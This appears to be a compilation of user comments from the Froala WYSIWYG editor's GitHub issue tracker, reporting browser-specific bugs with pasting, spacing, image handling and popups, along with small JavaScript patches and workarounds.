html of .fr-element.fr-view and then $('#editor').froalaEditor('events.trigger', 'contentChanged');, would you expect a $('#editor').froalaEditor('html.get'); from within the contentChanged event handler to return my new inner html that I set just before?. (Commenting here since it's the latest issue for this question, and as a framework plugin/addon contributor.)\nThe Ember.js direction (and front-end development in general) is to move away from having a jQuery dependency. I think it's important that Froala follow this trend to stay relevant. Perhaps Froala Editor 3.x.?. \ud83d\ude09 . Interesting, I didn't realize that. With the ember addon switch from bower to npm for the editor dep, it became more apparent to me now. Thanks for the info!. Is it possible to initialize the froala-editor instances after the slider is open? I believe the froala-editor does some of it's own alignment stuff and that probably really takes a toll on the sliding animation.\nNote, I'm not with the froala core team, just a suggestion from a fellow user. :). Will this event also fire if the initOnClick option is not used?  Just wondering if I have to look for that option to determine what event (initialized or initializationDelayed) to attach to, or if I can just use initializationDelayed all the time. Thanks!. @kurdin You are attaching the event handler after initializing the editor... Instead;\njs\n$(function(){\n    $('#edit').on('froalaEditor.initialized', (e, editor) => {\n        alert('initialized');\n    });\n    $('#edit').froalaEditor({\n        // toolbarInline: true,\n        // initOnClick: true\n    });\n});.

I'll take another look when I have a chance, and provide more details if possible. \nThanks for your help!\n. @stefanneculai I took another look at this one, and I am still able to replicate this bug against Froala version 2.3.5. Users who insert images before any other content in IE are required to click a second time after clearing the image editor controls before the cursor appears. \nI modified _exitEdit() slightly to fix the issue for our users. The entire (modified) function looks like this: \n```javascript\nfunction _exitEdit (force_exit) {\n  if ($current_image && (_canExit() || force_exit === true)) {\n    editor.toolbar.enable();\n$image_resizer.removeClass('fr-active');\n\neditor.popups.hide('image.edit');\n\n$current_image = null;\n\n// Cursor positioning fix\nif (editor.browser.msie) {\n  _placeCursor();\n}\n\n_unmarkExit();\n\n}\n}\n```\nThe extra call to _placeCursor() puts the cursor on a new line, all ready to accept new input.

One or two specific machines seemed to have this issue regularly (maybe 50% of the time), but we were never able to figure out why. The one consistent factor was that these were older, slower Windows machines, but that's not too much to go on. . @GMiLL5 I saw this same thing, and I was also unable to get it to throw an error. I did end up changing the line: \njavascript\n$(img).after('<br>' + $.FE.MARKERS);\nto: \njavascript\n$($(p_node).find('img')[0]).after('<br>' + $.FE.MARKERS);\nwhich uses the already located element for the cursor placement instead. It's been a few months, and no problems so far, but it would be nice to get an official call from the developer as to what's going on here. . @stefanneculai thanks for looking into this. . @chrisdeeming you appear to have a typo in your issue title.. @chrisdeeming it's happened to the best of us \ud83d\ude04 .

I tried 2.9.3 also but behavior was same.\nFor me none of the pop up - Insert Link, Insert Image, Edit link was working. When ever I click on insert image or insert link button, pop up shows up and hides itself within seconds. It's working fine on other browser. I realized may be my IE version on server is ram consuming and something is happening at the back.\nI opened froala_editor.pkgd.min.js and saw showInsertPopup function is the one which gets executed and calculate all the offset values and positioning of popup. I put the entire function into the setTimeout method and provided 0 secs time out. After this pop up started working even on IE. May be IE is not able to handle all the statements and setTimeout helped in executing all this separately after some interval.

    "UCIS": "@stefanneculai I should have commented that one out in the example, but exactly the same problem occurs when the scrollable container is not set, as is shown here: https://jsfiddle.net/rdg5yL0p/7/\n\nClick the text in the iframe, toolbar appears, scroll iframe, toolbar stays in the same position.\nScroll the iframe down, click the text in the iframe, toolbar appears in the wrong position.\n\nHover over the toolbar buttons. Tooltip appears inside the iframe, in the correct position (if the toolbar would be positioned correctly). If the cursor is near the (lower) edge of the iframe, the tooltip is clipped by the iframe bounds, even though the toolbar is visible.. As we have a commercial license I was able to fix the problem in the original source. Can I post the patch here? The changes we had to make:\n\n\nCreate the tooltip inside the current window.document, not inside the target document.\n\nIn the at function, if the o_win.document != $container[0]ownerDocument, subtract the o_win scrollTop and scrollLeft (2*).\nBind the showInline function to the scroll event on o_win.. Unfortunately this forces the toolbar to be inside the iframe, making it dependent on styling inside the iframe and clipping by the iframe.\n\nAlso the scrollableContainer option is listed as a string in the documentation, and setting this to an element/jquery object may cause problems during JSON serialization as shown here: https://jsfiddle.net/bysp4rxv/3/. @stefanneculai I am not sure why the fiddle suddenly started working. Looking at the sourcecode and debugger, Froala seems to use a shortcut without cleanup when the pasted text (plaintext) matches previously copied content, which may in itself be incorrect since it allows to insert arbitrary HTML into the editor, as long as the resulting plaintext matches the copy buffer in local storage.\nAnyway, it still does not work cross-domain. To reproduce:\n\nOpen https://jsfiddle.net/ec0e675e/ and https://codepen.io/anon/pen/xLbwXJ\nTry to copy the text inside the froala editor from jsfiddle to codepen.\nThe text will be copied, but the button element will be removed.\n\nFor comparison you may try to paste into TinyMCE (eg at https://www.tinymce.com/docs/demo/basic-example/). You will see that the button is pasted (although styling is off).\nThe problem is in the two lines (in the unminified froala_editor.js) containing: div.querySelectorAll('*:empty:not(br):not(img):not(td):not(th)');\nThis removes the  because it has no DOM content. I think the input and iframe tags should be added to the list of exceptions, as those are all valid in a froala editor (with some plugins):\ndiv.querySelectorAll('*:empty:not(br):not(img):not(td):not(th):not(input):not(iframe)');. @stefanneculai the issue is partially fixed with the latest update. Two (smaller) issues still remain:\n\n\nBehavior is still inconsistent between pasting and drag-drop. Drag-drop uses line breaks (br), while pasting uses paragraphs (p). This can be seen on the test case at https://jsfiddle.net/p3oeyL7f/\nI am not sure which one is the best one, since both have their use cases, but it might be nice if behavior would be consistent and configurable.\n\n\nThe div tag must be allowed for mult-line pasting to work correctly, even though it does not appear in the pasted content. See https://jsfiddle.net/0etc8jq2/ where pasting multi-line content in the first and second froala editor produces different results, with the first one losing single newlines entirely.\n\n\nTest content to be copied and pasted from a plain-text editor:\n```\nTest\nLine 2\nLine 3\n```.

    "jipigi": "Hello ! \nI'm working  at Laval University in Quebec, and we are in the process of getting a solution for rich text editing in our LMS. Froala is on of the best solutions we found on the market at the moment but this non-breaking space issue is really a problem for us too. \nNon-breaking space are an important part of good formating practices and lacking this functionnality is almost a deal breaker here at Laval.  At least it would be good to allow inserting it from the special characters popup. \n@stefanneculai, do you think that could be possible even with your custom code in place ?\nAbout that custom code dealing with multiple normal spaces user may input, I think normal spaces should be strip server side (even if wysiwyg would not be respected in that specific case), and let user enter explicitly non-breaking space if he really wants to format his text with spaces, which is a bad idea from my point of vue. Formating should be achieve with RTE functionnality, not with spaces... But again, that's only my opinion and I can imagine cases where this could be needed. \nThanks for your excellent work on that piece of software.. I've made some tests and native content-editable behaviour toward spaces in chrome is indeed just like Froala : \n- First normal space you type after a word is transformed into a nbsp. If you don't type anything else, it will stay that way.\n\n- As soon as you a character other than a space, nbsp is replaced by a normal space.\n\n- If you add a second space after the first one, you got two nbps along each other.\n\n- If you type a third space, then you you end with a normal space surrounded by two nbsp.\n\n- And it can go on like that, normal space and nbsp couple following each other as long as you hit the space bar.\n\nI've tested native content-editable behaviour in Edge and Firefox also, both don't transform normal space in nbsp, so you can enter as many following normal spaces ou want. But in all 3 browsers, it seems  impossible to type or copy/paste a nbsp.\nI'm really surprised at this because nbsp are necessary in languages like french and many others, for example to make correct use of ponctuation like \u00ab \u00bb or :. Maybe I'm missing something ? \nAs I mentionned in my previous comment, I think Froala should enable simple nbsp via special characters popup, like other editor does.\n. @stefanneculai, thank you for your answer. \nI can see why you redesign it in the version 2. And yes, it's probably better for most cases. But it's still a requirement for lots of languages to be able to use nbsp. The best solution would keep this behaviour, but still allow insertion of a &nbsp; via special character modal and prevent Froala (or chrome) to replace it by a normal space later on, only in this case.\nDo you think we could have a work around which works like this ?\n.

    "robclancy": "The 250ms limit on this has caused us issues. We have many areas which are hidden until input but it feels buggy to the user if they type a sentence and the whole form doesn't show until they stop. IMO the debounce should only be for internal stuff but the contentChanged event should be instance or with a separate, much faster debounce. Looking at the code the contentChanged event is part of the undo buffer which seems weird.\nAnother example is a field with a error that makes it red, but when they type the red it meant to go away. Once again this will be delayed. This editor should function like a textarea with superpowers but instead it acts like it is on a server and you have to wait for the server.\n250ms is also too long. Default of 500ms is way too long as can be seen in this issue (pretty much always press a button and get a \"this is required\" error because 500ms hasn't passed yet.\nAnyway going to hack it to have no minimum and set to 100ms.\n(this comment is a mess because I edited lots based on what I read). We have this issue too. Doesn't happen all the time. I am able to reproduce by editing an old image in a table cell from our legacy articles from when we used redactor.  In a table cell it actually gets quite buggy, will try make something you can reproduce with.\nI actually can't reproduce after some editing on the same article, will keep messing with it and try get it reproducible. \nI have had similar issues before where the overlay would essentially \"lockup\" the editor. I think you should add a click event to the overlay that checks if there is anything selected / any popup. Bit hacky though.. Testing more the mouseup event isn't stopping the handle resizing, I then click to make it fire again and it stops the resizing however the overlay stays and the editor is locked.\nEDIT: it only ever happens \"first\". So after froala has added styles etc from its first change to the content if I refresh (it auto saves) and try again there are no bugs. This makes me think some CSS somewhere is causing this issue. Copying same content into codepen doesn't reproduce.. I can't reproduce on codepen and can't spend more time debugging, will wait for more user reports. If it is only legacy data then might be fine for us anyway.. Yeah I couldn't reproduce on the demo sites or in the codepen or whatever\nservice I used which means something on my page is conflicting in some way.\nI've had the issue in different situations.

Why? That seems like a very weird design choice. Completely inconsistent and makes using froala feel buggy to users if you use ember or angular. I hope this project isn't an \"it's a feature\" echo chamber to avoid doing work. \n\nI don't care about html.insert but html.set which the ember and angular components use and won't autolink if the models have data already not created by froala.\nSo now I have to make our own components to hack in this functionalty because I can't even fork this properly.. @stefanneculai do you have a rough estimation on when this will be flagged as a release and for the ember version to follow suit? . Our update still won't be out for a week or 2 that includes the font awesome update so can probably wait. And I don't like that they force old icons to work with the new ones, I want them both to be able to work together during a transition period but they have hardcoded it in FA5 to use SVG icons for FA4. So I am more likely to run a custom version with that stuff hacked out (it's 3 lines I need to comment out to make it work, FA5 should have it wrapped in an option tbh).. ",
    "dswitzer": "Here's a video of the problem. I illustrate the behavior in both FF 51.0.1 and Chrome 56.0.2924.87 on Windows 10. However, I see the same behavior in every browser I've tested so I'm pretty sure it's some kind of parsing issue.\nhttps://youtu.be/4kTP9oOO9Ck. Still working on debugging, but the problem appears to be in the function restore () {} method. The problem is in the following code when I press the space bar. The prev_node.textContent = prev_node.textContent + next_node.textContent; code is altering the block element and then the call to editor.spaces.normalize(prev_node); is corrupting the spacing.\n```\n// Previous node and next node are both text.\nif (prev_node && next_node && prev_node.nodeType == Node.TEXT_NODE && next_node.nodeType == Node.TEXT_NODE) {\n  // Remove markers.\n  $(start_marker).remove();\n  $(end_marker).remove();\n// Save cursor position.\n  var len = prev_node.textContent.length;\n  prev_node.textContent = prev_node.textContent + next_node.textContent;\n  $(next_node).remove();\n// Normalize spaces.\n  editor.spaces.normalize(prev_node);\n// Restore position.\n  range.setStart(prev_node, len);\n  range.setEnd(prev_node, len);\nspecial_case = true;\n}\n```. Thanks. That seems to fix it. . @stefanneculai \nI'm sending you the file offline.. Just to be clear, I'm seeing this when I select the entire Word document into the clipboard and paste the contents into Froala. \nI'm using an Office 365 subscription and an I'm on Word 2016 v1611 (build 7571.2109).. @stefanneculai \nWhen I do the following:\n.on('froalaEditor.image.error', function (e, editor, error, response){\n    console.log(editor.image.get());\n});\nI'm not seeing references to the actual image in the DOM, which is what I want. I'm also seeing null returned for a most of the images.\nKeep in mind that this error is being triggered during a paste operation, so there could be multiple images being processed in a single operation.. This looks like a duplicate of #1785.. I can replicate the issue just by running the following in the console:\n(new DOMParser()).parseFromString(\"<h1>hello world</h1>\", 'text/html').children\nIf I run this in Edge, I get undefined. Changing children to firstChild gets me what I expect.\nThe use of firstChild works in all supported browser.. Great work! This is fixed in the new 2.5.1 release. Thanks!. Great work! This is fixed in the new 2.5.1 release. Thanks!. Maybe the parsing needs to be improved then, because in my testing in FF and Chrome today I was seeing a lot of images in the RTF content that aren't getting converted to images. That's why I opened up the suggestion.. Check the RTF Word document I emailed you earlier. That should show off an example. It's where I got the sample in the data stream above.. I was testing between MS Edge, Chrome 56 and FF 52. In all cases I was seeing data in the RTF string that's not getting converted to an image.. Sorry, Windows 10.. Great work! This is fixed in the new 2.5.1 release. Thanks!. This happens in Windows 10 too using 2.5.1:\n\n. That looks intriguing as a way to fix the CORS issue.. I actually had a chance to finally play around with this, while it addresses the issue it ends up generated a lot of HTTP requests. I'm seeing an HTTP request for each of the following:\n\nThe original image is requested\nThen the CORS URL is requested\nAnother HTTP request is sent to then send the Base64 data to upload the image to the server\nFinally, the final image uploaded URL is requested\n\nSo if you paste a request that has dozens of images, this workflow really added up.\nHowever, in my original proposal there's a lot less HTTP requests:\n\nThe URL is passed to the proxy, which handles the downloading and uploading\nThe final image URL is requested\n\nIn my testing, using the proxy is much more efficient.\n. It's not a required step, it's optional for someone who wants to handle it that way. Users who want to have users upload images are going to need an upload script anyway, so I don't see this as being any real problem. The only difference between the upload and proxy endpoints, are the proxy grabs the file from an HTTP request and the upload script gets it from the file upload.. @stefanneculai \nThere's still something odd going on. While extra spaces are not getting added, the extra spaces are showing. At first I thought it was a CSS issue, but the white-space setting seems to be set to normal.\nOpen the test froala_extra_spaces_issue_htm.txt document and look at the text. Then copy and paste it into the Froala Editer (https://www.froala.com/wysiwyg-editor/).\nYou'll see that each space in the code it's rendering a space\u2014but multiple spaces should be collapsed.\nYou can see an example here. There are 2 spaces after each period. When you view the document normally, you only see a single space because the white space is properly collapsed. However, once it's pasted both white spaces show.\nEach time I press the space bar another white space shows.\n\n. I'm still seeing this issue:\nhttps://jsfiddle.net/dswitzer/c9xn3qe9/\nIf you place a space at the end of the first paragraph you can see the content really gets messed up. It's converted whitespace into &nbsp; that should never be getting converted.\nThe _normalizeNode() function in $.FE.MODULES.spaces is the root problem. Since it's based on a regex parser, it just does not correctly identify whitespace within a block/inline element.\nI'm really not sure why it's trying to translate the spaces in the first place\u2014it seems like it should be leaving them alone.\nTo resolve the problem, I changed the following line in _normalizeNode() from:\nif (editor.html.isPreformatted(parent_node)) return;\nTo:\n/* MOD */\n      // Added the htmlUntouched check, to avoid issues where extra spaces are being incorrectly converted into nobreak spaces and\n      // rendered as spaces\n      if (editor.opts.htmlUntouched || editor.html.isPreformatted(parent_node)) return;\nWhat's the idea behind the need for _normalizeNode()?. While you'd lose the CORS proxy, I suspect you can avoid this behavior by setting the imageUploadRemoteUrls option to false.. IMO, the security aspect of this is super critical. I think most users would be surprised that images being pasted are being passed through your servers. And well you may be deleting them, what if that changes? What if there's a bug and the files are being wiped? \nI think it's great you're offering the service, but it should be something users opt-in to, not something that just happens. At a bare minimum, I think it has to be extremely clear that this is going to happen. I think most users upgrading from 2.7.0 to 2.7.1 would be surprised to find images might be getting sent to your servers.. While this might not be the same issue, \nI've seen this happen w/IE11 when the Word is using an object for the layout. It renders the Word object as an image.\nHere's an example of that behavior.\nText Pasted as Image in IE11.docx. ",

For example (using the demo on the website)\n<p style=\"text-align: center;\">\n    <span class=\"fr-img-caption fr-fir fr-dii\" style=\"undefined\">\n        <span class=\"fr-img-wrap\" style=\"width: 200px;\">\n            <img width=\"200\" src=\"https://cdn0.froala.com/assets/editor/pages/B/editor-photo-645d411798e5b4e825765d091dd5aaab.jpg\" alt=\"Editor photo\">\n            <span class=\"fr-inner\">This is a caption</span>\n        </span>\n     </span>\n</p>\nIt seems to me that this should have been done by using the figure and figcaption semantic elements, instead of awkwardly using span for everything. For example, something like:\n<p style=\"text-align: center;\">\n    <figure class=\"fr-img-caption fr-fir fr-dii\">\n        <img width=\"200\" src=\"https://cdn0.froala.com/assets/editor/pages/B/editor-photo-645d411798e5b4e825765d091dd5aaab.jpg\" alt=\"Editor photo\">\n        <figcaption class=\"fr-inner fr-caption\">This is a caption</figcaption>\n    </figure>\n</p>\nDo you have some intuition for why relying on <span> instead of more semantic elements is the best way to go?\nThanks,\nAndrew\n. Hi @dianaprajescu, thanks for the link, was informative. I understand having read the related ticket why the span decision was made, and I'm glad to hear that <figure> support will be considered for a future major version. \nOne possible approach might be to add a configuration option to the image plugin that would allow the user to chose their caption style without forcing existing users into the change. Obviously, adding conditional support increases code complexity, but it might be a good way to collect more data before making a final decision.. Hi @stefanneculai, I'm experiencing a very similar issue which I think is related. I'm observing that using the Image \"by URL\" option, instead of the image being embedded as-is from the target URL (my expected behavior) the image is sent to the imageUploadURL for upload. In my case I'm using a custom upload URL with special logic and I've observed a bunch of images get saved to my s3 bucket which were intended to simply be linked from external sources.\nI tested including the diff from your previous post 724067d5e5b88c668f017f127bb0376dd5617ac1, but I'm still seeing the same behavior under the latest version of the file 367de39b0238616536988c1802af4e38d5735ff0.\nExpected Behavior\nWhen using imageByURL, the image simply embeds directly creating  tag with the src attribute equal to the provided URL.\nObserved Behavior\nPOST request is sent to my imageUploadURL to save the image as if I had instead used imageUpload.\nOS\nWindows 10\nBrowser \nVersion 63.0.3239.132 (Official Build) (64-bit)\nI hope this can be prioritized because currently my S3 bucket is getting polluted with people's .gifs every time someone wants to post something from imgur :(\nEDIT: You can reproduce this behavior on the froala home page directly using the example editor and the Insert Image By URL option.\n.

Works in Firefox. \nOur customers were reporting disappearing images as they appear to have pasted properly until you preview or save. \nHere's an example doc that shows the error in Chrome.\nDisappearingImage.docx. Thanks, Stefan. I believe the reason this behavior is the expected is because blockquotes act that way in at least two other major editors (CKEditor and TinyMCE). People used to working with blockquotes in those are reporting this as a bug to us. We do have a workaround (applying the blockquote last applies it to the whole section), but I wanted to put this on the radar in case others run into the same complaints. . Hi @poohitan! Sorry for the delay. Here's the workaround:\n\nDon't add the blockquote first. If you already have a blockquote and want to add more content, temporarily remove the blockquote (highlight and decrease the blockquote).\nCreate the content you want to be inside the blockquote. This can be include paragraphs, lists, images, line breaks, etc.\nHighlight the entire section and apply a blockquote. \n\nThis works around the fact that you cannot use Enter or Shift+Enter in the blockquote to add more content.. @kaniansky @stefanneculai \nWe were able to fix it by adding Chrome to line 11131 in froala_editor.js\nif (editor.browser.chrome || editor.browser.safari) {\nHope that helps!.

It appears that this is a problem with or without using the iframe option.. @stefanneculai Any chance this can get looked at sooner? This is breaking some of our customer workflows.. @stefanneculai I noticed that the \"waiting-details\" label is still on this issue. Is there anything else I can provide that could help here?. @stefanneculai That's not quite the issue. Whether I'm hosting my froala code on the same domain or not, the styles should behave the same within the editor. This is definitely a bug in Froala. In both cases the Froala styles are being added, but when hosted on the same domain, extra styles are being applied that should not be. Please see my explanation in https://github.com/froala/wysiwyg-editor/issues/2527#issuecomment-361300813. I submitted a new issue for this at https://github.com/froala/wysiwyg-editor/issues/2614. @dianaprajescu It looks like this is still an issue in some cases.\nSteps to reproduce:\n\nClick on any other built-in popup, such as link or color\nClick on custom popup button (the star)\nClick outside the editor\n\nResult: The custom popup does not hide\nExpected Result: The custom popup hides, just like other popups. Ah, it appears that that is only the case when using the popup: true option. I was told to use that option in a previous ticket. Removing it makes the popup hide as expected.. ",

Our solution was ugly but simple: The editor used to grow with it's content, and as soon as the window grew large enough to warrant a scrollbar, Froala's image overlay basically won't go away.\nSo, we made the page tall enough that it always has a bit of a scrollbar to it; Ugly, but it has been saving us numerous headaches when our clients try to resize their content within the editor..

I found solution, but want to be sure that it is ok to override Froala styles.. @stefanneculai thank you! I have updated demo http://jsfiddle.net/xdm4sjpb/10. \nPopups now are working fine. \nResize indicator still does not appear. \nAlso you can see that insert column/row button appears in the wrong place.\nAnd scollableContainer throws an error.. This is Original document.docx. Also, for version 2.7.1 in IE 11.0.9600.18816 on Windows 7, we get:\nhtml\n<p><span style='font-family: \"Calibri\",sans-serif; font-size: 15px;'><a href=\"https://www.froala.com/wysiwyg-editor\"><a href=\"https://www.froala.com/wysiwyg-editor\" rel=\"noopener noreferrer\" target=\"_blank\">https://www.froala.com/wysiwyg-editor</a></span></p>\nYou can see that empty link is not closed. We cannot reproduce this issue on the official site. For the same document we get:\nhtml\n<p><span style='font-family: \"Calibri\",sans-serif; font-size: 15px;'><a href=\"https://www.froala.com/wysiwyg-editor\"></a><u><a href=\"https://www.froala.com/wysiwyg-editor\">https://www.froala.com/wysiwyg-editor</a></u></span></p>.

If the link does not convert to a link, the error does not happen.\n Relates to special characters in long URLs\n* Browser does not crash, it simply hangs in a long loop somewhere inside Froala\nFix:\n\nStart froalaEditor with linkConvertEmailAddress: false\nAND/OR\nRemove URL plugin from Froala\n\nI would not mark this as a bug in Froala, more like a \"this might happen\" -situation.

Note that my initial tests have been done with SwiftKey.\nI started with an empty editor, typed \"test\" 3 times and then highlighted the middle one and gave it a link. The resulting HTML was:\n<p>Test <a href=\"http://Example.com\">test</a> test&nbsp;</p>\nI placed my cursor at the end of the linked \"test\". The link edit tooltip is displayed and my keyboard displays some autocomplete options. I choose \"testing\" and it removes the link. Resulting HTML:\n<p>Test testing&nbsp;&nbsp;test&nbsp;</p>\nIf I redo the process but type \"ing\" manually, this is the resulting HTML:\n<p>Test <a href=\"http://Example.com\">test</a>ing&nbsp;test&nbsp;</p>\nIf I put my cursor in the middle of the word -- between the E and S in \"test\", I'm given an autocomplete option of \"tests\".

    "ibnesayeed": "I was able to replicate it on Google Chrome on Android as well (by strategically adding some extra text in the home page's example to make the anchor text break in two lines).. @stefanneculai, what are some practical issues in not trying to position it in the middle of the anchor text, but below the cursor position? I can think of one issue, when the user is using LEFT/RIGHT keys to move the cursor, the tooltip will follow, but this can be strategically stopped from happening unless the cursor moves to the next line.\nThere is another possibility which seems more practical and elegant that the tooltip should be positioned in the middle of the only part of the anchor text that is in the line where the cursor is positioned (this means tooltip wont follow the cursor as it moves left and right). This will be great from usability perspective, even if the anchor text wraps in several lines. With this approach in place, the example in the screenshot above would behave in a way that the tooltip will be positioned in the middle of the text \"framework\" while the cursor is still somewhere in that word, but it will jump down to the middle of the word \"plugins\" when the cursor moves to the next line while still within the anchor text.\nTo calculate the mid point of the part of the anchor text in the current line, we will need X and Y coordinates of the start of the anchor text, end of the anchor text, editable area's far left and right X coordinates, and the current cursor position. I can elaborate on this further, if such information is available and developers are willing to try this approach.. Thanks @stefanneculai for insights, that makes sense when considering the kind of usage other customers might have. It is not such a big deal, but in future we might be able to come up with a more elegant solution that handles many of the use cases.. ",

Could you maybe have a second look at this issue?\nMaybe more recent Chrome versions don't lose the selection anymore (as you described) if you don't \"preventDefault\" the touchstart listener?\nMaybe setting the CSS property touch-action on the toolbar could help?\nIs there a Chrome bug report about this issue?. Thank you! :slightly_smiling_face: . This issue does not affect Chrome on macOS but it affects Chrome on Linux and Chrome on Windows.. Thanks! :slightly_smiling_face: . At least the version of Froala shipped with XenForo 2.0.10 (Froala 2.8.4) doesn't have this bug. And https://www.froala.com/wysiwyg-editor doesn't have this bug either, so I guess it's still fixed in Froala 2.8.5.\nTested in Chrome 69 on Linux.. IMHO this issue is a little annoying although Froala is a great WYSIWYG-Editor in general.\nCould you please have a look? \ud83d\ude42. @stefanneculai Please reconsider: Even Microsoft Word automatically trims whitespace when inserting a link (after using doubleclick-to-select). So the native behaviour is to select the whitespace but the native behaviour is also to trim whitespace when inserting a link etc.. @stefanneculai The dominant office app on Windows (Microsoft Office) trims the selection before applying an action (source). It is unexpected behavior if Froala behaves differently. Could you please make Froala trim whitespace, too?. @stefanneculai This issue doesn't exist in a normal textarea (try it here on GitHub for example). It only happens in Froala. Please reopen.. Yes, the issue only exists in the editor but not in the contenteditable field below.. I'm using Gentoo Linux but this issue isn't Linux-only. It was originally reported by one of our users running Windows. You should be able to reproduce it (at least) in Chrome on Windows.. I can reliably reproduce it using Chrome 67 on Windows 10 (via BrowserStack).. @stefanneculai Ok, I've done that. Could you please turn the feedback into an idea such that others can vote for it?. If someone else finds this idea useful then vote here: https://wysiwyg-editor-roadmap.froala.com/public/ideas/5530.

We want to serve to live clean html withought utility classes meant for the editor.\nWe want to ensure that these classes will never reach our frontend.\nWe can strip them away ourselves but when we upgrade if a new class is introduced that will leak into the system until it's noticed. The software that generates these classes should have the responsibility of removing them (aka Inversion of control).. You have 2 type of classes.\n1. Internal controls - example, fr-draggable\n2. Styling - example fr-dib\nThe control related classes should be strippable from final content\nThe styling should be customisable so they can be adjusted to existing CSS (not sure if this is possible atm, haven't tried to modify that part yet)\n. Which makes perfect sense for the editor. But the content is not generated to stay in the editor. We push this content in multiple channels. Example, web pages. On production frontend pages fr-draggable should not exist (it's control class for the editor and not used for styling)\nThese type of classes must be stripped from web pages (they are not needed, they add bytes, they add nodes to browser nodes indexing, etc)\nAs I mentioned we can strip them ourselves but since the editor is a component that can be updated, we want to be able to update it withought concerns about \"What new control classes might have been introduced\". This can only be done from the editor itself since the editor knows which classes are meant for editor usage only and not styling and only the editor can make this future-proof.. I have loaded content that had no fr- classes at all (from our older editor) and Froala did a great job at adding all the control classes where needed.. Fair enough. By any chance could you introduce a function that would return an array with all the control classes used by the specific instance? We can then leverage this one and future-proof eliminate them from the content.. Ok, but this is not future proof solution. Just keep it in mind as it could be very helpful for future proof modular systems.\nRegarding the styling classes (example fr-dib) is there some way I can rename them in the Froala instance setup through the options?\n\nOn 6.

However we use multiple languages under the same domain and the configuration of the SCAYT settings in Froalla are generated dynamically.\nBy my understanding, the data should be updated every time a Froala is initialised (preferrably should be instance dependant though I don't really mind as all the editors on a page use always the same language)\nAre you planning on fixing that?\n.

I will  try your suggested fix later today and come back to you if there is any issue.. I think the link to SO is https://stackoverflow.com/questions/41994388/froala-editor-focus-cursor-on-page-load.. Update: I sent an email into Froala support as I needed a workaround. Stefan responded to tell me that the focus can be set via:\nselector.froalaEditor('events.focus', true).\nSo in my pen where I use a delay to simulate time passing between Froala init() and the focus call,  I modified to:\nsetTimeout(function(){\n    $('#edit').froalaEditor('events.focus', true);\n      console.clear()\n      console.log('fired focus trigger!')\n  }, 2000)\nAnd it works. However, whilst it IS good to know the way ahead, this is not the gist of the current API documentation which does not provide this insight and seems instead to hint at the syntax being \n$('#selector').froalaEditor('events.trigger', 'focus');\nPlease clarify the documentation.\nAdditionally, Stefan also showed me how to set focus at Froala init(), which may be of use to others so here is the example. This uses the jquery event bus to capture the froalaEditor.initialized event and then users the passed-in editor object to call for focus.\n$('div#froala-editor')\n     .on('froalaEditor.initialized', function (e, editor) {\n      editor.events.focus(true);\n    }).froalaEditor({\n      toolbarButtons: ['bold', 'italic', 'underline', 'strikeThrough', 'subscript', 'superscript', 'fontFamily', 'fontSize', '|', 'specialCharacters', 'color', 'emoticons', 'inlineStyle', 'paragraphStyle', '|', 'paragraphFormat', 'align', 'formatOL', 'formatUL', 'outdent', 'indent', '-', 'quote', 'insertHR', 'insertLink', 'insertImage', 'insertVideo', 'insertFile', 'insertTable', '|', 'undo', 'redo', 'clearFormatting', 'selectAll', 'html', 'applyFormat', 'removeFormat', 'fullscreen', 'print', 'help'],\n      pluginsEnabled: null\n    })\n.

Just FYI, using the editor.edit.on() and editor.edit.off() methods cause all kinds of problems with image editing. I have a toggling system for which I need the editor to have a read only mode, which Froala does not have a true option for.

I'm in a similar position where I have built a plugin for a system that uses it and now I'm trying to find a good replacement. I was hoping Adobe could open source it and let people host the (probably heavy and for them costly) backend components on their own servers now when they are killing it. But that is unlikely to happen.. @stefanneculai Yea, I saw them too and was thinking about them. But how will you handle their subscription fee? Will every user have to have their own subscription if they want to enable the feature?. @m1is: Yes, that is correct. For existing production applications support will continue until November 2018. I raised the idea of them making it open source and allow people to host the back end on their own servers (since that is probably what costs a bit for them to keep running). But they seem happy with just letting it die. Perhaps we could get a petition going? :). @stefanneculai If you make your own solution I'd love if you open sourced it. It would probably help a lot of people in this position due to Adobe's crap move.. These won't help me much since my need is for the web. I can understand if Adobe sees no money in this and only have to pay for servers etc. But just shutting it down after the history of Aviary and not provide any solution or releasing the code as open source is quite crappy to be honest. Especially since I contacted Adobe and asked them about their plans for the image editor and it's future before I started implementing my project and was told they had no plans on removing it or even starting to charge for it.\nThen, a few months after I released my thing, they kill it :P. @BjornMelgaard: I get \"The page you were looking for doesn't exist\"... Should I put my tinfoil hat on? :). @stefanneculai I was about to do the SAME thing in my project. I have tried contacting the developer without luck though. Do you have any idea on how to add the ability to save the file to the server. \n\nOpen file located on server (open url)\nEdit file\nPost/save file on server replacing the existing one. Yea, but I don't think the documentation is very clear.\n\ntoDataURL returns a DOMString containing the requested data URI. Sounds a bit diffuse. I would expect for instance the image data encoded somehow so I can post it to for instance a PHP backend. This might be what they mean, but URI doesn't sound like this is what I would get. But if you have had time to test the function, what does it return?\nDo you get something like:\n\"image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADIAAAAyCAIAAAC....\". @ianwantstea But this is the exact implementation I have made in my project. I even used the desired callbacks instead of deprecated ways and I was told this was going to go away. I have received no other mail saying \"hey, we changed our minds\". This seems very strange.

The CSS is only present to visualize the issue. Without it it wouldn't be as apparent.\nThe element is still left in the DOM as a child to body when navigating to another view. Please consider re-opening this as it is an issue with the DOM being cluttered for single-page apps.. Yes, however the issue is that the quick-insert helper isn't removed when changing route, since it's a single-page app. It remains in the body even though another view has been loaded that doesn't contain any Froala editor instances. I'm guessing it's treated as a page load which isn't triggering the destroy events.\nAny advice on how to handle this for single-page apps would be welcome.. Righto, we'll look into that. Thanks!. @stefanneculai We've attempted the recommended approach to destroy all editor instances before navigating to another page, however this does seem to make any difference. We also noticed that other elements such as the color picker behave in the same way.\nAn example on how the DOM looks after navigating to another page without any Froala editors:\n\nNavigating back to a page with editors adds duplicate elements, which causes this to be very problematic for single page apps:\n\n. @stefanneculai sorry, I'm not quite following. I made a JSFiddle in my initial post in this issue with reproduction steps for this issue. Do you need me to update it in any way?. @stefanneculai I've updated the JSFiddle from the first post: https://jsfiddle.net/zn8L0xku/15/\nNotice that even when explicitly destroying editors both before the model updates but also when changing route, the steps to reproduce still causes the quick-insert elements to be stranded in the DOM..

